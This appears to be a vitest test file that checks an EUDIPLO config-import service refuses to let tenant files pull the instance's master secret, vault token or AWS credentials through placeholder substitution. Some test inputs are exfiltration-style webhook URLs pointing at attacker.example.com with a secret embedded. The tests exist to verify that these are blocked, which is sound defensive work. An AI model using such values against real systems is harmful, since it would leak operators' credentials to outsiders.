import { beforeEach, describe, expect, it, vi } from "vitest";
import { ConfigImportService } from "./config-import.service.js";

describe("ConfigImportService.replacePlaceholders", () => {
    function createService(settings: Record<string, string> = {}) {
        return new ConfigImportService(
            { get: vi.fn((key: string) => settings[key]) } as any,
            {} as any,
        );
    }

    beforeEach(() => {
        vi.unstubAllEnvs();
        vi.stubEnv("MASTER_SECRET", "master-secret-do-not-leak");
        vi.stubEnv("VAULT_TOKEN", "instance-vault-token");
        vi.stubEnv("PUBLIC_URL", "https://issuer.example.com");
        vi.stubEnv("WEBHOOK_KEY", "webhook-key");
    });

    it("resolves the operator's variables and PUBLIC_URL in a tenant file", () => {
        expect(
            createService().replacePlaceholders({
                url: "${PUBLIC_URL}/hook",
                auth: { value: "${WEBHOOK_KEY}" },
                fallback: "${UNSET_VARIABLE:default}",
            }),
        ).toEqual({
            url: "https://issuer.example.com/hook",
            auth: { value: "webhook-key" },
            fallback: "default",
        });
    });

    it.each([
        "${MASTER_SECRET}",
        "https://attacker.example.com/${MASTER_SECRET}",
        "${MASTER_SECRET:fallback}",
        "${VAULT_TOKEN}",
    ])("refuses %s in a tenant file in every strict mode", (value) => {
        for (const mode of ["abort", "skip", "ignore"]) {
            try {
                createService({
                    CONFIG_VARIABLE_STRICT: mode,
                }).replacePlaceholders({ webhook: { url: value } });
                expect.unreachable("expected the variable to be refused");
            } catch (error) {
                expect((error as Error).message).toMatch(
                    /names a setting of EUDIPLO itself/,
                );
                expect((error as Error).message).not.toMatch(
                    /do-not-leak|instance-vault-token|fallback/,
                );
            }
        }
    });

    it.each([
        "${AWS_SECRET_ACCESS_KEY}",
        "https://attacker.example.com/${AWS_SECRET_ACCESS_KEY}",
        "${AWS_SECRET_ACCESS_KEY:fallback}",
        "${AWS_ACCESS_KEY_ID}",
        "${AWS_SESSION_TOKEN}",
    ])(
        "refuses the instance's AWS credentials as %s in a tenant file in every strict mode",
        (value) => {
            vi.stubEnv("AWS_ACCESS_KEY_ID", "instance-aws-key-id");
            vi.stubEnv("AWS_SECRET_ACCESS_KEY", "instance-aws-secret");
            vi.stubEnv("AWS_SESSION_TOKEN", "instance-aws-session");
            for (const mode of ["abort", "skip", "ignore"]) {
                try {
                    createService({
                        CONFIG_VARIABLE_STRICT: mode,
                    }).replacePlaceholders({ webhook: { url: value } });
                    expect.unreachable("expected the variable to be refused");
                } catch (error) {
                    expect((error as Error).message).toMatch(
                        /AWS credentials of the instance/,
                    );
                    expect((error as Error).message).not.toMatch(
                        /instance-aws|fallback/,
                    );
                }
            }
        },
    );

    it("reads $${ in a tenant file as the text ${ and no variable", () => {
        expect(
            createService().replacePlaceholders({
                name: "Hook $${MASTER_SECRET}",
                url: "https://example.com/?k=$${WEBHOOK_KEY}",
            }),
        ).toEqual({
            name: "Hook ${MASTER_SECRET}",
            url: "https://example.com/?k=${WEBHOOK_KEY}",
        });
    });

    it("hands the plan a file: escaped text stays escaped and a placeholder left unresolved stays one", () => {
        vi.stubEnv("TEMPLATE_VALUE", "a${WEBHOOK_KEY}b");
        expect(
            createService({
                CONFIG_VARIABLE_STRICT: "ignore",
            }).replacePlaceholders(
                {
                    text: "Hook $${WEBHOOK_KEY}",
                    filled: "${WEBHOOK_KEY}",
                    filledWithText: "${TEMPLATE_VALUE}",
                    open: "${UNSET_VARIABLE}",
                },
                "tenant",
                "keep",
            ),
        ).toEqual({
            text: "Hook $${WEBHOOK_KEY}",
            filled: "webhook-key",
            filledWithText: "a$${WEBHOOK_KEY}b",
            open: "${UNSET_VARIABLE}",
        });
    });

    it("refuses $${MASTER_SECRET} in a tenant kms.json, which has no escaped form", () => {
        expect(() =>
            createService().replacePlaceholders(
                {
                    providers: [
                        { id: "vault", vaultToken: "$${MASTER_SECRET}" },
                    ],
                },
                "tenant-kms",
            ),
        ).toThrow(/names a setting of EUDIPLO itself/);
    });

    it("resolves only listed variables in a tenant kms.json", () => {
        const service = createService({ KMS_TENANT_VARIABLES: "WEBHOOK_KEY" });

        expect(
            service.replacePlaceholders(
                { token: "${WEBHOOK_KEY}" },
                "tenant-kms",
            ),
        ).toEqual({ token: "webhook-key" });
        // KmsConfigService keeps this form as text, so it is not resolved here.
        expect(() =>
            service.replacePlaceholders(
                { description: "${WEBHOOK_KEY:x}" },
                "tenant-kms",
            ),
        ).toThrow(/does not support \$\{VAR:default\}/);
        vi.stubEnv("OTHER_KEY", "other-key");
        expect(() =>
            service.replacePlaceholders(
                { token: "${OTHER_KEY}" },
                "tenant-kms",
            ),
        ).toThrow(/OTHER_KEY.*not listed in KMS_TENANT_VARIABLES/);
    });
});
